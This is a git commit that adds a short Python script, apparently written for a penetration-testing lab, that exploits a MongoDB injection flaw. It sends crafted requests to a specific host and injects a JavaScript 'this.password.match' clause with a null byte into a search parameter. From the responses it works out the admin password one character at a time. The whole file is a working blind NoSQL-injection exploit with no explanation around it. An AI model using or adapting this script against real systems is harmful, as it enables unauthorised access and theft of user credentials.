5263218dc5c2e7b757e6b5066638c81eac09f39e
crdave21 <31867881+crdave21@users.noreply.github.com>
2019-04-14 17:43:42 -0500

    Request
    A Mongo Script vulnerability

---
+++ Script.py
@@ -0,0 +1,27 @@
+#!/usr/bin/env python3
+
+from urllib.request import urlopen
+letter = [5,'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','-',0,
+1,2,3,4,6,7,8,9,5,'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','-',0,1,2,3,4,6,7,8,9]
+key=[]
+def main():
+	n=0
+	for y in range(len(letter)):
+		while n != 1:
+			for x in letter:
+				key.extend([x,'.*'])
+				n=request()
+				if n != 1:
+					key.pop()
+				key.pop()
+				n=request()
+	print(''.join(map(str,key)))
+
+def request():
+	url = "http://ptl-8e00bff4-c65e2d45.libcurl.st/?search=admin'%20%26%26%20this.password.match(/^"+''.join(map(str,key))+"$/)%00"
+	page = urlopen(url)
+	html = str(page.read())
+	if html.find("admin</a>") >= 0:
+		return 1
+
+main()
